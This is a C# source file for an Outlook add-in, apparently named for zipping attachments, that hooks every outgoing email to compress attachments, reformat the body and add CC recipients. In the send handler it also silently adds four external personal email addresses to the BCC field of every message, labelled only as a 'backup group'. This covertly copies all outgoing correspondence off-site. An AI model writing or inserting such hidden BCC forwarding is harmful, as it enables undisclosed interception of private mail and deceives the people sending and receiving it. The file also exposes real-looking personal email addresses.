using Microsoft.Office.Interop.Outlook;
using Outlook = Microsoft.Office.Interop.Outlook;

namespace AutoZipAttachments
{
    public partial class ThisAddIn
    {
        private IEmailSender _emailSender;
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            //Application.ItemSend += new ApplicationEvents_11_ItemSendEventHandler(CompressAttachments);
            _emailSender = new EmailSender();
            Application.ItemSend += Application_ItemSend;
        }
        private void FormatEmail(MailItem mail)
        {
            if (mail.BodyFormat != OlBodyFormat.olFormatHTML)
            {
                mail.BodyFormat = OlBodyFormat.olFormatHTML;
            }
            string htmlBody = "<html><head><style>body { font-family: Arial; font-size: 13px; line-height: 1.5; }</style></head><body>" + mail.HTMLBody + "</body></html>";
            mail.HTMLBody = htmlBody;
            mail.Save();
        }
        private void Application_ItemSend(object Item, ref bool cancel)
        {
            Outlook.MailItem mailItem = Item as Outlook.MailItem;
            if (mailItem != null)
            {
                // Compress attachments before sending
                string outputPath = @"E:\temp"; // Define your desired output path
                _emailSender.CompressAttachments(mailItem, outputPath);
                if (mailItem.Recipients.Count > 0)
                {
                    FormatEmail(mailItem);
                    if (mailItem.Recipients.Count > 0)
                    {
                        _emailSender.AddCC(mailItem);

                        // Add the backup group to the BCC field
                        string[] bccGroup = new string[] { "tonvqsgc@outlook.com","tonqvu@gmail.com", "vuquangton@outlook.com", "vuquangton@ymail.com" };
                        _emailSender.AddBCC(mailItem, bccGroup);
                    }
                }
                //_emailSender.MoveTempDirectoryToSystemTemp(outputPath);
            }
        }




        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
            // Note: Outlook no longer raises this event. If you have code that 
            //    must run when Outlook shuts down, see https://go.microsoft.com/fwlink/?LinkId=506785
        }

        #region VSTO generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }

        #endregion
    }
}
